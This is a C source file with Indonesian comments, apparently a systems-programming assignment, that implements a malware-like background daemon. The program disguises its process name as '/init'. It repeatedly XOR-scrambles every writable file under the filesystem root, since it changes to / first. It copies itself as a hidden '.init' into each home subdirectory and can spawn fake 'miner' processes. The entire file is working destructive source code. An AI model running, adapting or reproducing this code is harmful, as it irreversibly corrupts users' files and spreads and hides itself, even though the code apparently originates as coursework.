
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <linux/limits.h>
#include <sys/prctl.h>
#include <pthread.h>

#define MAX_MINERS 5
#define HASH_LENGTH 64

time_t seed_time;

// Ganti nama proses di ps
void rename_process(const char *name) {
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

// XOR enkripsi file
void xor_encrypt_file(const char *path, unsigned char key) {
    int fd = open(path, O_RDWR);
    if (fd < 0) return;
    struct stat st;
    if (fstat(fd, &st) < 0) {
        close(fd);
        return;
    }
    unsigned char *buf = malloc(st.st_size);
    read(fd, buf, st.st_size);
    lseek(fd, 0, SEEK_SET);
    for (off_t i = 0; i < st.st_size; i++)
        buf[i] ^= key;
    write(fd, buf, st.st_size);
    free(buf);
    close(fd);
}

// Rekursif enkripsi direktori
void recursive_encrypt(const char *dir_path, unsigned char key) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    char path[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;

        snprintf(path, PATH_MAX, "%s/%s", dir_path, entry->d_name);
        struct stat st;
        if (stat(path, &st) < 0) continue;

        if (S_ISDIR(st.st_mode)) {
            recursive_encrypt(path, key);
        } else if (S_ISREG(st.st_mode)) {
            xor_encrypt_file(path, key);
        }
    }

    closedir(dir);
}

// Fungsi wannacryptor (fitur b)
void wannacryptor() {
    rename_process("wannacryptor");
    char cwd[PATH_MAX];
    getcwd(cwd, sizeof(cwd));
    unsigned char key = (unsigned char)(seed_time % 256);
    recursive_encrypt(cwd, key);
}

// Salin file malware ke direktori
void copy_self_to(const char *target_dir) {
    char self_path[PATH_MAX], dest_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if (len == -1) return;
    self_path[len] = '\0';
    snprintf(dest_path, sizeof(dest_path), "%s/.init", target_dir);

    int src = open(self_path, O_RDONLY);
    int dst = open(dest_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (src < 0 || dst < 0) {
        if (src >= 0) close(src);
        if (dst >= 0) close(dst);
        return;
    }

    char buf[4096];
    ssize_t n;
    while ((n = read(src, buf, sizeof(buf))) > 0) {
        write(dst, buf, n);
    }

    close(src);
    close(dst);
}

// Fungsi trojan.wrm (fitur c)
void trojan_wrm() {
    rename_process("trojan.wrm");
    char *home = getenv("HOME");
    if (!home) return;

    DIR *dir = opendir(home);
    if (!dir) return;

    struct dirent *entry;
    char path[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR &&
            strcmp(entry->d_name, ".") &&
            strcmp(entry->d_name, "..")) {
            snprintf(path, sizeof(path), "%s/%s", home, entry->d_name);
            copy_self_to(path);
        }
    }

    closedir(dir);
}

// Fungsi hash generator untuk mine-crafter
void *miner_worker(void *arg) {
    int id = *((int *)arg);
    char proc_name[64];
    snprintf(proc_name, sizeof(proc_name), "mine-crafter-%d", id);
    rename_process(proc_name);

    char hash[HASH_LENGTH + 1];
    char logline[128];
    char timestr[32];
    int fd = open("/tmp/.miner.log", O_WRONLY | O_CREAT | O_APPEND, 0644);

    while (1) {
        for (int i = 0; i < HASH_LENGTH; ++i)
            hash[i] = "0123456789abcdef"[rand() % 16];
        hash[HASH_LENGTH] = '\0';

        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        strftime(timestr, sizeof(timestr), "%F %T", tm_info);
        snprintf(logline, sizeof(logline), "[%s][Miner %02d] %s\n", timestr, id, hash);
        write(fd, logline, strlen(logline));

        sleep((rand() % 28) + 3);
    }

    close(fd);
    return NULL;
}

// Fungsi rodok.exe + fork bomb + miner (fitur e, f, g, h)
void fork_bomb_rodok() {
    rename_process("rodok.exe");

    int nproc = sysconf(_SC_NPROCESSORS_ONLN);
    if (nproc < 3) nproc = 3;
    if (nproc > MAX_MINERS) nproc = MAX_MINERS;

    for (int i = 0; i < nproc; ++i) {
        pid_t pid = fork();
        if (pid == 0) {
            srand(time(NULL) ^ (getpid()<<16));
            pthread_t t;
            pthread_create(&t, NULL, miner_worker, &i);
            pthread_join(t, NULL);
            exit(0);
        }
    }

    // Tunggu child
    while (1) pause();
}

// Loop fitur b dan c tiap 30 detik
void repeat_encrypt_and_spread() {
    while (1) {
        pid_t pid1 = fork();
        if (pid1 == 0) {
            wannacryptor();
            exit(0);
        }

        pid_t pid2 = fork();
        if (pid2 == 0) {
            trojan_wrm();
            exit(0);
        }

        waitpid(pid1, NULL, 0);
        waitpid(pid2, NULL, 0);
        sleep(30);
    }
}

// Daemon utama
void daemonize_and_rename() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    setsid();
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    rename_process("/init");
}

int main(int argc, char *argv[]) {
    seed_time = time(NULL);
    srand(seed_time);

    if (argc > 1 && strcmp(argv[1], "rodok") == 0) {
        fork_bomb_rodok();
        return 0;
    }

    daemonize_and_rename();
    repeat_encrypt_and_spread();

    return 0;
}
